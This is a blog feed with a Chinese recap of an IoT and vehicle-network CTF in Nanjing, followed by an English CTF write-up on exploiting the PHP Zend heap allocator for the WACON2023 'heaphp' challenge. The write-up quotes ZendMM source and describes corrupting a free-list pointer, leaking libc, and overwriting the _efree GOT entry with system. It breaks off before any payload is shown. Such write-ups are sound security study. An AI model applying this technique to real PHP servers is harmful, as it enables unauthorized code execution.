        <content type="html"><![CDATA[<p>很久没打过这么久的线下了。</p><p>在南京，持续72小时，和世界各地的强力战队同台竞技。不得不说，听起来挺酷。</p><h1 id="我在南京遇到困难睡大觉"><a href="#我在南京遇到困难睡大觉" class="headerlink" title="我在南京遇到困难睡大觉"></a>我在南京遇到困难睡大觉</h1><p>之前从来没有接触过iot、iov一类的东西，于是我在比赛前一周开始零零散散地学。最后感觉有了一点固件分析和日路由器的基础; 车联网方面能找到的资料大多比较模糊零散且抽象，没有实际上手过，最后还是一头雾水。</p><p>实际上比赛中占大头的还是车联网。这个赛道包含t-box、ADAS黑白盒渗透，还有一个实地日车的挑战。</p><p>t-box黑盒题中有几个设备提供了arm固件，但是分析之后我确实找不到如何下手。有的看起来是一道逆向题，然而就算给出正确的输入，最后拿到的也不是题目要求的flag，此外也没有别的漏洞可以利用。还有一道存在一个数组2byte的越界，但是这个越界没有任何卵用，只能覆盖一个垃圾变量。或许调的libc存在漏洞？我没找到。</p><p>别的车联网相关利用就超出我的知识范围了，只能帮队友试试弱密码，找找敏感文件。属于参与感不强。不过看队友伪造CAN报文什么的还是挺炫酷，可能以后研究一下这方面？</p><p>此外比赛还有传统的ctf，不过并不计入总分，而是获取挑战其他题目资格的途径。做了道qiling框架的栈溢出，不过没啥新东西，最后还因为手输flag字符串导致末尾带\n，orw读不出来，debug了两个小时。度过了一段相对失败的比赛时间。</p><h1 id="我去，ALLES"><a href="#我去，ALLES" class="headerlink" title="我去，ALLES!"></a>我去，ALLES!</h1><p>之前因为一个比较喜欢的youtube博主LiveOverflow，了解到了他所在的这个德国战队。看到这次比赛邀请了ALLES，我还挺期待，虽然最后他没有来。</p><p>比赛第三天的时候，我还是受不了8：30出发的作息，于是睡大觉到了十一点。出门打车时，在酒店门口偶遇了ALLES!的三个哥们（有一个还没下来）。</p><p>于是我社交大师属性大爆发，上前搭讪。顺便问了问他们对这次比赛的看法，几位老哥很热情，轮流说了一大堆。总的来说就是比赛题目很有新意、也很难，顺便吐槽了以下这次比赛的文档”like random English words”，令人难绷。</p><p>不得不说，在这次国际战队普遍开摆的情况下，ALLES老哥反而玩的挺开心，还冲到了车联网前几。</p><h1 id="小厨娘与上流酒店"><a href="#小厨娘与上流酒店" class="headerlink" title="小厨娘与上流酒店"></a>小厨娘与上流酒店</h1><p>连着比赛几天，都是送的同一家店的盒饭（xx小厨娘），口味应该达到了生命体征维持餐的标准。除了第二天晚上送的是麦麦，不过每人只有一份汉堡和鸡翅，这种主办方就该被逐出麦门！</p><p>酒店倒挺豪华，每天还送一个水果。缺点是每天早上大家抢着吃早饭，电梯和餐厅的容量都不足以应对瞬时人流而接近瘫痪。还好我后面早上都睡大觉。</p><hr><p>iov渗透看起来还挺好玩，以后有空学学。</p><p>不过短期目标还是先考好这个B期末吧，不然以后想读研没学上了</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
            <tag> iot </tag>
            
            <tag> iov </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Brief Introduction to PHP Heap Exploitation</title>
      <link href="/php-pwn/"/>
      <url>/php-pwn/</url>
      
        <content type="html"><![CDATA[<p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p><h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p><h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p><p><img src="/../img/php-pwn.assets/image-20231209221140856.png" alt="image-20231209221140856"></p><p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;</span><br><span class="line">zend_mm_chunk     *next;</span><br><span class="line">zend_mm_chunk     *prev;</span><br><span class="line"><span class="type">uint32_t</span>           free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line"><span class="type">uint32_t</span>           num;</span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of allocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line">HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p><h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p><p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p><p>When we allocate a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When we release a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p><h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p><p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‘s actually what I encountered. </p><p>So, What ‘s the point of it ? I don ‘t know.</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p><p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p><p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p><p>by the way, the form of parameters looks weird</p><p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p><p>It doesn`t mean takeing exactly 2 parameters. In fact,  <code>a1</code> stands for the input args (parsed by something like <code>zend_parse_arg</code>), while <code>a2</code> stands for the return values. We may set type of <code>a1</code> to be <code>zend_execute_data *</code> and <code>a2</code> to be <code>zval *</code>. In practice, I set <code>a1</code> to be <code>_zval_struct *</code> for better comprehension.</p><p>After checking the declaration, the meaning of following parts a clear. (take <code>zif_add_note</code> for example)</p><p><img src="/../img/php-pwn.assets/image-20230915121612049.png" alt="image-20230915121612049"></p><p><code>v2</code> represents the total number of parameters, and here should be 2.</p><p><img src="/../img/php-pwn.assets/image-20230915121952724.png" alt="image-20230915121952724"></p><p>Here comes a type check. Refering the table and we find ‘6’ represents string. So arg1 should be a string ptr, and will be copied to <code>v4</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>zif_add_note</code> use <code>strlen</code> to caculate the length of input string and allocate corresponding memory. However, when using <code>memcpy</code> to copy content, the 3rd argument taken is the actual length of string. The consequences is that string can be cut off by NULL, which means we can overwrite the next memory`s fd.</p><p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p><h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure><p>And modify the php.ini file. You can <code>find</code> it in root directory.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure><p>Add the config at the file end</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure><p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p><p>To debug the extension, we run php with gdb attached first</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure><p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p><p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure><p>You can also write them in a gdb script.</p><h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p><p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p><p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p><p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address</span><br></pre></td></tr></table></figure><p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p><p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p><p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p><h2 id="Payload"><a 